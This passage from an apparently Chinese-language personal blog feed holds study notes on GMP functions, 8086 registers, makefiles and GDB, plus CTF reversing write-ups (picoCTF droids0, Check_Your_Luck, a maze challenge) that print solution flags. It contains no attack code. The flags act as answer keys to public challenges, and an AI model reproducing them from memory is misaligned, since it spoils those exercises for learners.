class="string">&#x27;bcfba4d0038d48bd4b00f82796d393dfec&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(result):</span><br><span class="line">    <span class="comment"># print(int.from_bytes(binascii.unhexlify((result[i] + result[i + 1])), byteorder=&#x27;little&#x27;))</span></span><br><span class="line">    enc = <span class="built_in">int</span>.from_bytes(binascii.unhexlify((result[i] + result[i + <span class="number">1</span>])), byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># 这里用到了int.from_bytes方法</span></span><br><span class="line">    <span class="comment"># print(binascii.unhexlify((result[i] + result[i + 1])))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc^<span class="built_in">list</span>[i//<span class="number">2</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="none"></h1><h1 id="c语言">C语言</h1><h2 id="高精度-gmp库">高精度—GMP库</h2><p>GMP(The GNU Multiple Precision Arithmetic Library)又叫GNU多精度算术库，是一个提供了很多操作高精度的大整数，浮点数的运算的算术库，几乎没有什么精度方面的限制，功能丰富。我刚接触到这个东西的时候是在学习PHP的过程中。GMP的主要目标应用领域是密码学的应用和研究、 互联网安全应用、 代数系统、 计算代数研究等。</p><h3 id="gmpz-init-set-str-函数">__gmpz_init_set_str() 函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mpz_init_set_str</span> <span class="params">(<span class="type">mpz_t</span> rop, <span class="type">char</span> *str, <span class="type">int</span> base)</span></span><br></pre></td></tr></table></figure><p>将str字符数组以 base 指定的进制解读成数值并写入 rop 所指向的内存</p><h3 id="gmpz-powm-函数">__gmpz_powm() 函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __gmpz_powm(<span class="type">mpz_t</span> rop, <span class="type">const</span> <span class="type">mpz_t</span> base, <span class="type">const</span> <span class="type">mpz_t</span> <span class="built_in">exp</span>, <span class="type">const</span> <span class="type">mpz_t</span> mod)</span><br></pre></td></tr></table></figure><p>将base求exp次幂,然后对mod求模,最后把结果存到rop中(可以用于编写RSA)</p><p>其他函数见文档</p>]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>8086汇编学习笔记1---寄存器</title>
      <link href="/2023-07-31-5933f1aa9e05/"/>
      <url>/2023-07-31-5933f1aa9e05/</url>
      
        <content type="html"><![CDATA[<h1 id="8086寄存器">8086寄存器</h1><p>不同CPU的寄存器个数结构不同,对于8086CPU,有14个寄存器,分为:</p><p>​AX,BX,CX,DX,SI,DI,SP,BP,IP,CS,SS,DS,ES,PSW</p><h1 id="通用寄存器">通用寄存器</h1><p>在x86架构的汇编语言中ax,bx,cx,dx是通用寄存器,用于存储数据或进行算术运算。这些寄存器的功能区别如下：</p><ol><li>AX (Accumulator): AX寄存器是累加器寄存器,用于执行算术和逻辑操作,以及存放函数返回值。在乘法和除法运算中,AX寄存器存储乘法的结果或除法的被除数。</li><li>BX (Base Register): BX寄存器通常用作基址寄存器,用于存放内存访问中的偏移地址。在一些特殊情况下,BX也可以用作通用寄存器。</li><li>CX (Count Register): CX寄存器通常用作计数器,特别是在循环操作中。它可以作为循环的计数值,并在循环执行过程中递减。</li><li>DX (Data Register): DX寄存器常用于存放一些数据,例如乘法的乘数或除法的除数。</li></ol><p>8086的寄存器均为16位,一个16位寄存器又可分为两部分,即kH,kL(k为A,B,C,D),各为一个字节(2字节/16位为一个字)</p><h2 id="ax寄存器">AX寄存器</h2><p>​AX寄存器一般用来存储临时数据,存储函数返回值,存储控制信息等,所以经常被用于MOV指令</p><h2 id="bx寄存器">BX寄存器</h2><p>​BX寄存器通常用于内存寻址,即用于存储内存地址或作为其他寄存器的间接寻址寄存器</p><p>​例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOV BX, 2000h    ; 将数据2000h传送到BX寄存器，作为内存地址</span><br><span class="line">MOV AX, [BX]     ; 将BX寄存器中存储的地址所对应的内存数据传送到AX寄存器</span><br><span class="line">MOV [BX], CX     ; 将CX寄存器的值传送到BX所指向的内存地址</span><br></pre></td></tr></table></figure><h2 id="cx寄存器">CX寄存器</h2><p>​CX寄存器常用于计数器,用来在循环中(Loop)计数和存储计数值</p><p>​Loop &lt;标号&gt;命令执行时,会进行两步操作:</p><p>​1.(cx)=(cx)-1;</p><p>​2.判断cx是否为0,如果为0则向下执行,否则跳转至标号处执行程序]</p><h2 id="dx寄存器">DX寄存器</h2><p>​DX常用于存储数据或者作为数据传输的缓冲区,例如存储循环累加的值</p><h1 id="段寄存器">段寄存器</h1><p>​在 8086 处理器中，共有四个段寄存器，它们是 CS (Code Segment)、DS (Data Segment)、SS (Stack Segment) 和 ES (Extra Segment),各个段寄存器的功能如下:</p><ol><li>CS (Code Segment)：指向代码段的起始地址，用于存储程序代码的位置。CS 寄存器中的内容加上指令的偏移地址，形成实际的物理地址，从而取得代码段中的指令。</li><li>DS (Data Segment)：指向数据段的起始地址，用于存储程序的全局数据和静态数据。DS 寄存器中的内容加上数据的偏移地址，形成实际的物理地址，从而访问数据段中的数据。</li><li>SS (Stack Segment)：指向栈段的起始地址，用于存储程序的运行时栈。SS 寄存器中的内容加上栈中数据的偏移地址，形成实际的物理地址，从而操作栈中的数据。</li><li>ES (Extra Segment)：额外段寄存器，用于存储其他数据段的起始地址。在特定情况下，程序可以使用 ES 寄存器来访问额外的数据段。</li></ol><p>参阅:</p><p>​<a href="https://blog.csdn.net/tju_zxl/article/details/128766360">https://blog.csdn.net/tju_zxl/article/details/128766360</a></p>]]></content>
      
      
      <categories>
          
          <category> 汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> 寄存器 </tag>
            
            <tag> 8086 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>makefile的使用</title>
      <link href="/2023-07-29-8c1bed83c499/"/>
      <url>/2023-07-29-8c1bed83c499/</url>
      
        <content type="html"><![CDATA[<h1 id="makefile基本规则">makefile基本规则</h1><h2 id="一-格式">一.格式:</h2><p><strong>Target</strong> : Dependencies…</p><p>Command…</p><p>这即为一个规则,其中:</p><ol><li><p>Target 为目标,是规则的名字,也是make命令的入口.</p><p>Target可以是目标文件—main.o main等等</p><p>也可以是伪目标—并非真正要生成的文件,而是一个标签,不要和实际要生成的文件同名,一般为一个有意义的名字,可以描述其下Command命令功能的名字</p><p>Target中一般只有一个文件;多个文件用空格分开,但是必须为相同类型的文件</p></li><li><p><strong>Dependencies</strong>为依赖文件列表</p><p>例如main依赖main.o和hello.o,即为:</p><p>main:main.o hello.o</p><p>如果依赖文件一个都不写的话,那么只要输入make命令command命令就会执行</p><p>一般都将生成可执行文件的规则放在第一个,如下(?):</p> <img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190209136.png" alt="image-20230729190209136" style="zoom:33%;" /><p>如果不想将命令显示出来,在每条Command命令前都加上@即可:</p></li></ol><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190236956.png" alt="image-20230729190236956" style="zoom:33%;" /><h2 id="二-自动化变量">二.自动化变量</h2><ol><li>每一条规则都有互不冲突的变量:</li></ol><table><thead><tr><th>$&lt;</th><th>规则的第一个依赖文件名</th></tr></thead><tbody><tr><td>$^</td><td>规则的所有依赖文件列表</td></tr><tr><td>$@</td><td>规则的目标文件名</td></tr></tbody></table><p>使用自动化变量可以简化规则的书写,例如:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190322189.png" alt="image-20230729190322189" style="zoom: 33%;" /><p><strong>注意:自动化变量只能用于Command中,不能用于每个规则的第一行</strong></p><ol start="2"><li>可以定义变量替代一系列文件名:</li></ol><p>targets=main.o add.o sub.o</p><p>该变量相当于全局变量,可以用在任何出现main.o add.o sub.o的地方</p><p>但是使用的时候写法为$(targets)而不能直接使用targets</p><p>一般只需要定义如下变量放于开头:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190425899.png" alt="image-20230729190425899" style="zoom:33%;" /><p>分别为:最后可执行文件的变量;生成该可执行文件所需要的所有.o文件的变量;所有头文件的变量</p><h1 id="makefile的简化">makefile的简化</h1><p>一.%.o:%.c</p><p>观察下面规则:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190520197.png" alt="image-20230729190520197" style="zoom:33%;" /><p>可以使用</p><p>%.o:%.c</p><p>gcc -c $&lt; -o $@</p><p>来简化</p><p>%.o代表所有的.o文件,%.c代表所有的.c文件</p><p><strong>注意</strong>:尽管写在了一起,但是仍然是&quot;只有发生改变的文件以及与该文件有依赖关系的文件才会重新编译&quot;</p><h1 id="makefile隐含规则">makefile隐含规则</h1><p>隐含规则是系统在makefile中已经写好的,隐含的一些规则</p><ol><li>将.c文件编译生成.o文件</li></ol><p>make会自动推导出这种规则,并生成.o文件</p><p>所以前面的规则可以写成:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190606717.png" alt="image-20230729190606717" style="zoom:33%;" /><h1 id="存在多个makefile文件时执行哪一个">存在多个makefile文件时执行哪一个</h1><ol><li>make命令能够找到的makeflie文件只能是makefile或Makefile</li></ol><p>其他名字需要使用-f参数,例如:</p><p>make -f makefile1</p><p>make clean -f makefile1</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729190646494.png" alt="image-20230729190646494" style="zoom:25%;" />]]></content>
      
      
      <categories>
          
          <category> 知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB调试的使用</title>
      <link href="/2023-07-29-c0fbb9744b11/"/>
      <url>/2023-07-29-c0fbb9744b11/</url>
      
        <content type="html"><![CDATA[<h1 id="gdb概述">GDB概述</h1><h2 id="gdb组成架构">GDB组成架构</h2><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/241-s2r1grmfpvr.png" alt="img" style="zoom:50%;" /><h2 id="基本工作原理">基本工作原理</h2><p>gdb 通过系统调用 <code>ptrace</code> 来接管一个进程的执行。ptrace 系统调用提供了一种方法使得父进程可以观察和控制其它进程的执行，检查和改变其核心映像以及寄存器。它主要用来实现断点调试和系统调用跟踪。</p><h3 id="三种调试方式">三种调试方式</h3><p>​直接运行并调试一个新进程</p><p>​运行并调试一个新进程</p><p>​运行 gdb，通过命令行或 <code>file</code> 命令指定目标程序。</p><p>​输入<code>run</code>命令， gdb 执行下面的操作：</p><p>​通过 <code>fork()</code> 系统调用创建一个新进程</p><p>​在新创建的子进程中执行操作：<code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code></p><p>​在子进程中通过 <code>execv()</code> 系统调用加载用户指定的可执行文件</p><p>​attach并调试一个已经运行的进程</p><p>​用户确定需要进行调试的进程 PID</p><p>​运行 gdb，输入 <code>attach &lt;pid&gt;</code>，gdb 将对指定进程执行操作：<code>ptrace(PTRACE_ATTACH, pid, 0, 0)</code></p><p>​远程调试目标机上新创建的进程</p><p>​gdb 运行在调试机上，gdbserver 运行在目标机上，两者之间的通信数据格式由 gdb 远程串行协议（Remote Serial Protocol）定义</p><p>​RSP 协议数据的基本格式为： <code>$..........#xx</code></p><p>​gdbserver 的启动方式相当于运行并调试一个新创建的进程</p><h1 id="使用gdb前的准备">使用GDB前的准备</h1><p>编译</p><p>​一般关闭-o优化选项</p><p>​打开-g调试选项</p><p>​-Wall打开所有warning</p><h1 id="gdb启动-退出-查看代码命令">GDB启动/退出/查看代码命令</h1><p>启动退出</p><p>​gdb 可执行文件 —启动调试</p><p>​quit/ctrl+d —退出</p><p>设置参数/获取设置参数</p><p>​set args 10 20</p><p>​show args</p><p>GDB使用帮助</p><p>​help</p><p>查看当前文件代码</p><p>​list/l —从默认位置显示</p><p>​list/l &lt;行号&gt; —从制定的行显示</p><p>​list/l &lt;函数名&gt; —从指定的函数开始显示</p><p>​disassemble/disas —反汇编命令</p><p>​<code>disas &lt;func&gt;</code> 反汇编指定函数</p><p>​<code>disas &lt;addr&gt;</code> 反汇编某地址所在函数</p><p>​<code>disas &lt;begin_addr&gt; &lt;end_addr&gt;</code> 反汇编从开始地址到结束地址的部分</p><p>查看非当前文件代码</p><p>​list/l &lt;文件名:行号&gt;</p><p>​list/l &lt;文件名:函数名&gt;</p><p>设置显示的行数</p><p>​show list/listsize</p><p>​set list/listsize &lt;行数&gt;</p><p>其他</p><p>​pwd —显示工作目录</p><p>​shell —不离开gdb就能运行shell命令</p><p>​directory/dir —设置查找源文件的路径(或者gdb的-d参数)</p><h1 id="gdb断点命令">GDB断点命令</h1><p>设置断点</p><p>​b/break &lt;行号&gt;</p><p>​b/break &lt;函数名&gt;</p><p>​b/break &lt;文件名:行号&gt;</p><p>​b/break &lt;文件名:函数名&gt;</p><hr><p>​tbreak —临时断点,如同break,只不过在一次命中后被删除</p><p>查看断点</p><p>​i/info b/break</p><p>删除断点</p><p>​d/del/delete 断点编号</p><p>设置断点无效</p><p>​dis/disable 断点编号</p><p>设置断点生效</p><p>​ena/enable 断点编号</p><p>设置条件断点</p><p>​b/break 10 if i==5</p><h1 id="gdb调试运行命令">GDB调试运行命令</h1><p>运行GDB</p><p>​start —停止于第一行</p><p>​run —运行到下一个断点</p><p>继续运行到下一个断点</p><p>​c/continue</p><p>向下执行一段代码(不会进入函数体)</p><p>​n/next</p><p>向下单步调试(遇到函数步进)</p><p>​s/step —步进</p><p>​finish —运行直至跳出函数体</p><p>反向步进程序</p><p>​reverse-step [n] —反向步进程序,直到到达另一个源码行的开头,n表示执行n次,或某种原因程序停止</p><p>变量操作</p><p>​p/print 变量名 —打印值</p><p>​ptype 变量名 —打印类型</p><p>自动变量操作</p><p>​display num —自动打印指定变量的值</p><p>​undisplay —取消…</p><p>​i/info display</p><p>​undisplay 编号</p><p>其他操作</p><p>​until —跳出循环</p><p>​until &lt;行号&gt; —在函数内，进行指定位置跳转，执行完区间代码</p><h1 id="表达式监视-修改命令">表达式监视/修改命令</h1><p>print &lt;表达式&gt; —对任意正确的表达式进行求值并打印</p><p>display &lt;表达式&gt; —每次单步进行指令后,紧接着输出被设置的表达式及值(单步运行非常有用)</p><p>watch &lt;表达式&gt; —设置一个监视点,一旦被监视的&quot;表达式&quot;的值改变,gdb将强行终止正在被调试的程序</p><p>​另外 <code>rwatch</code> 表示在访问时停止，<code>awatch</code> 表示在访问和改变时都停止</p><p>whatis —查询变量或函数</p><p>info &lt;函数&gt; —查询函数</p><p>info locals —查看当前堆栈页所有的变量</p><p>set var 变量名=变量值 —修改变量的值</p><h1 id="特殊执行命令">特殊执行命令</h1><p>运行代码</p><p>​call 函数(参数) —调用和执行函数</p><p>​return <expression> —取消函数调用的执行,expression被当做函数的返回值</p><p>生成代码</p><p>​make —不退出gdb就能重新产生可执行文件</p><h1 id="内存查看命令">内存查看命令</h1><table><thead><tr><th>命令</th><th style="text-align:left">子选项</th><th>解释</th></tr></thead><tbody><tr><td>x</td><td style="text-align:left">x/3 内存地址</td><td>需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的u定义</td></tr><tr><td></td><td style="text-align:left">x/f 内存地址</td><td>f 表示显示的格式 ：  x 按十六进制格式显示变量。  d 按十进制格式显示变量。   u 按十进制格式显示无符号整型。   o 按八进制格式显示变量。   t 按二进制格式显示变量。   a 按十六进制格式显示变量。   i 指令地址格式   c 按字符格式显示变量。   f 按浮点数格式显示变量。</td></tr><tr><td></td><td style="text-align:left">x/u 内存地址</td><td>u表示一个地址单元的长度    b表示单字节，    h表示双字节，    w表示四字节，    g表示八字节</td></tr><tr><td>举例</td><td style="text-align:left">x /3dw 内存地址</td><td>打印3个四字节，按照10进制格式打印(即将上面各个部分组合起来)</td></tr></tbody></table><p>例如:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230729165808207.png" alt="image-20230729165808207"></p><p>这里打印了str[0]~str[15]的所有值(以16进制)</p><p>另外,使用 $ida(“xxx”)可以通过IDA名称获取地址,例如 $ida(“main”)  (?)</p><h1 id="堆栈和寄存器处理命令">堆栈和寄存器处理命令</h1><p>bt —查看当前函数调用栈,即当前函数调用的上一层函数以及它们的调用栈信息</p><p>up/down n —在堆栈中向上/向下移动n层</p><p>frame n —切换到第n层堆栈</p><p>info相关的命令</p><p>​info frame —查看当前堆栈帧的信息，包括函数名、参数、返回地址等</p><p>​info args —查看当前函数的参数信息</p><p>​info locals —查看当前函数的局部变量信息</p><p>​info registers —查看所有寄存器的信息</p><p>print /x $reg —以16进制格式查看指定寄存器reg的值</p><p>set $reg = value —设置指定寄存器reg的值为value</p><h1 id="查询运行状态命令">查询运行状态命令</h1><p>where/bt —当前运行的堆栈列表(?)/查看程序出错原因</p><p>bt backtrace —显示当前调用堆栈</p><p>up/down —改变堆栈显示的深度</p><p>info program —查看程序的是否在运行，进程号，被暂停的原因</p><h1 id="注意">注意</h1><p>1.GDB不会自动在程序入口点暂停,所以需要在执行前设置好断点</p><p>部分转载于:</p><p><a href="https://www.wenjiangs.com/doc/lkor5lfsdn#gdb-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"></a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GDB </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制作业第二周</title>
      <link href="/2023-07-28-b008bf7590af/"/>
      <url>/2023-07-28-b008bf7590af/</url>
      
        <content type="html"><![CDATA[<h1 id="re">RE</h1><h2 id="droids0-pico2019">droids0(pico2019):</h2><p>这是一个安卓逆向的入门题(根本没有逆向,老样子在帮你部署环境),根据hint去安装了Android Studio</p><p>​资料:</p><p>​<a href="https://blog.csdn.net/weixin_43734793/article/details/124966390">https://blog.csdn.net/weixin_43734793/article/details/124966390</a></p><p>​<a href="https://blog.csdn.net/andylao62/article/details/23456881">https://blog.csdn.net/andylao62/article/details/23456881</a></p><h3 id="安装的一点点事情">安装的一点点事情:</h3><p>​1.电脑要有JDK5或之后的版本</p><p>​2.安装后的初始化出现网络问题,即无法访问插件网址,这里因为电脑有某lash,进行了手动的代理设置</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728112025801.png" alt="image-20230728112025801" style="zoom:50%;" /></p><p>​正在疯狂解压↑</p><p>​<s>感觉和Jetbrain家风格好像(难道是一家的?)</s></p><p>​<s>怎么好多东西都是第一次使用要在线下载</s></p><h3 id="现在就直接运行一遍">现在就直接运行一遍</h3><p>​根据提示了解到flag会在log中输出,直接运行就行:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728114115242.png" alt="image-20230728114115242" style="zoom: 25%;" /></p><p>​flag:   picoCTF{a.moose.once.bit.my.sister}</p><p>​虽然不是很懂,特别是连java都不会,但是好歹环境没问题</p><p>​<s>正解</s>到这里就结束了</p><h3 id="现在记录一点折腾的过程">现在记录一点折腾的过程</h3><p>​<s>听说java中间会解释出某种叫做字节码的东西</s></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728114819343.png" alt="image-20230728114819343" style="zoom:50%;" /></p><p>​假装看懂↑</p><p>​不管如何,我们凭借着c++(学姬算鸡)的底子,了解到怎么也得是先找到main函数入口:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728114942680.png" alt="image-20230728114942680" style="zoom: 50%;" /></p><p>​然后虽然看不懂字节码,但是硬看…(主要是现在还没有去搞java逆向的工具…待会儿折腾…):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728115047864.png" alt="image-20230728115047864" style="zoom:50%;" /></p><p>​你发现了吗…再往下看,凭借我小学800词的英语底子我看到了这个:</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728115206070.png" alt="image-20230728115206070" style="zoom:50%;" /></p><p>​看来是某个类方法,但是属实是不会看这字节码,也不了解java apk的变量结构(<s>那就学</s>):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728115525767.png" alt="image-20230728115525767" style="zoom:50%;" /></p><p>​经过学习某个叫做smail的东西,我们可以知道是调用了某个静态函数(不知道是全局函数还是静态成员方法—java有全局函数吗?),那么进一步分析语法去找参数吧</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728120749186.png" alt="image-20230728120749186" style="zoom:50%;" /></p><p>​这东西为啥是空的…到此为止…字节码分析失败,以后还是得去看看java逆向,光有字节码不行</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728120855903.png" alt="image-20230728120855903" style="zoom:50%;" /></p><p>​盲猜v0寄存器里存的就是flag的主体,跪求哪位椰叶如果知道这个做法有没有搞头,评论踢我一脚…</p><p>​</p><p>​到此为止吧,至少运行跑出来了…</p><h2 id="check-your-luck">Check_Your_Luck</h2><p>很显然是求解线性方程组…但是我手头没有代码(线代老师饶了我吧QWQ)</p><p>我们使用正则(我太懒了):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">patt:</span><br><span class="line">\(v \* (-?[\d]+) \+ w \* (-?[\d]+) \+ x \* (-?[\d]+) \+ y \* (-?[\d]+) \+ z \* (-?[\d]+) \=\= (-?[\d]+)\)</span><br><span class="line">替换为:</span><br><span class="line">$1,$2,$3,$4,$5 $6\n</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728130450039.png" alt="image-20230728130450039" style="zoom: 50%;" /><p>处理后,丢入到在线计算线性方程组中(因为我没有写过求解线性方程组的代码—回头补上):</p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728130615285.png" alt="image-20230728130615285" style="zoom: 50%;" /></p><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728130824736.png" alt="image-20230728130824736" style="zoom:33%;" /></p><p>​现在直接组装起flag即可…或者运行一遍…</p><p>​flag{4544_123_677_1754_777}注意要换成NSSCTF{4544_123_677_1754_777}</p><p>​正则真是个好东西啊,怎么各位做题都不用捏?<s>(还是说椰叶们用了但WP里没写)</s></p><p>​结束…</p><h2 id="help">help</h2><p>​代码都一看就懂,会生成一个map地图,动调提取出来,然后肉眼写吧(路径是wasd四个方向也一眼就看出来了)</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230728175513441.png" alt="image-20230728175513441" style="zoom:45%;" /><p>​处理脚本:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//BFS实现</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> map2[] = &#123;</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,   <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span>,   <span class="number">1</span>,   <span 